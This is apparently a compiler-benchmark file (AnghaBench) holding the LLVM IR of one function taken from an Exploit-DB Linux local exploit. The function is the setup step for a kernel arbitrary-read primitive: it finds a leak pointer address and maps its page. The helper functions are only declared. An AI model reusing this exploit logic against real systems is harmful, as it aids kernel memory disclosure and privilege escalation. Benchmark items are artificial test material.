; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45175.c_arbitrary_read_init.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45175.c_arbitrary_read_init.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [28 x i8] c"[.] setting up proc reader\0A\00", align 1
@g_proc_reader = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [10 x i8] c"[~] done\0A\00", align 1
@.str.2 = private unnamed_addr constant [28 x i8] c"[.] checking /proc/cpuinfo\0A\00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"[~] looks good\0A\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"[.] setting up timer\0A\00", align 1
@.str.5 = private unnamed_addr constant [34 x i8] c"[.] finding leak pointer address\0A\00", align 1
@g_leak_ptr_addr = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [18 x i8] c"[+] done: %016lx\0A\00", align 1
@.str.7 = private unnamed_addr constant [31 x i8] c"[.] mapping leak pointer page\0A\00", align 1
@PAGE_SIZE = common dso_local global i32 0, align 4
@llvm.used = appending global [1 x i8*] [i8* bitcast (void ()* @arbitrary_read_init to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @arbitrary_read_init() #0 {
  %1 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0))
  %2 = call i32 @proc_init(i32* @g_proc_reader)
  %3 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0))
  %4 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0))
  %5 = call i32 (...) @cpuinfo_check()
  %6 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0))
  %7 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0))
  %8 = call i32 (...) @leak_setup()
  %9 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0))
  %10 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.5, i64 0, i64 0))
  %11 = call i32 (...) @bisect_leak_ptr_addr()
  store i32 %11, i32* @g_leak_ptr_addr, align 4
  %12 = load i32, i32* @g_leak_ptr_addr, align 4
  %13 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.6, i64 0, i64 0), i32 %12)
  %14 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.7, i64 0, i64 0))
  %15 = load i32, i32* @g_leak_ptr_addr, align 4
  %16 = load i32, i32* @PAGE_SIZE, align 4
  %17 = sub nsw i32 %16, 1
  %18 = xor i32 %17, -1
  %19 = and i32 %15, %18
  %20 = load i32, i32* @PAGE_SIZE, align 4
  %21 = call i32 @mmap_fixed(i32 %19, i32 %20)
  %22 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0))
  ret void
}

declare dso_local i32 @info(i8*, ...) #1

declare dso_local i32 @proc_init(i32*) #1

declare dso_local i32 @cpuinfo_check(...) #1

declare dso_local i32 @leak_setup(...) #1

declare dso_local i32 @bisect_leak_ptr_addr(...) #1

declare dso_local i32 @mmap_fixed(i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
